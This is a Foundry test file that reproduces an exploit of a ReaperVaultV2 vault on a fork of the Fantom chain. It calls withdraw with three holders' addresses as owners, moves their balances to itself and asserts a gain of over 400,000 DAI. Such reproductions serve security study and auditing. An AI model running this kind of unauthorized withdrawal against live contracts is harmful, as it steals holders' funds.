// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/ReaperVaultV2.sol";

interface IERC20Like {
    function balanceOf(address _addr) external view returns (uint);
}

contract ReaperHackTest is Test {
    ReaperVaultV2 reaper = ReaperVaultV2(0x77dc33dC0278d21398cb9b16CbFf99c1B712a87A);
    IERC20Like fantomDai = IERC20Like(0x8D11eC38a3EB5E956B052f67Da8Bdc9bef8Abf3E);

    function testReaperHack() public {
        vm.createSelectFork("https://rpc.ankr.com/fantom/", 44000000);
        console.log("Your Starting Balance:", fantomDai.balanceOf(address(this)));
              
        address[] memory whales = new address[](3);
        whales[0] = 0xfc83DA727034a487f031dA33D55b4664ba312f1D;
        whales[1] = 0xEB7a12fE169C98748EB20CE8286EAcCF4876643b;
        whales[2] = 0x954773dD09a0bd708D3C03A62FB0947e8078fCf9;

        for (uint i; i < whales.length; i++) {
            reaper.withdraw(reaper.maxWithdraw(whales[i]), address(this), whales[i]);
        }

        console.log("Your Final Balance:", fantomDai.balanceOf(address(this)));
        assert(fantomDai.balanceOf(address(this)) > 400_000 ether);
    }
}

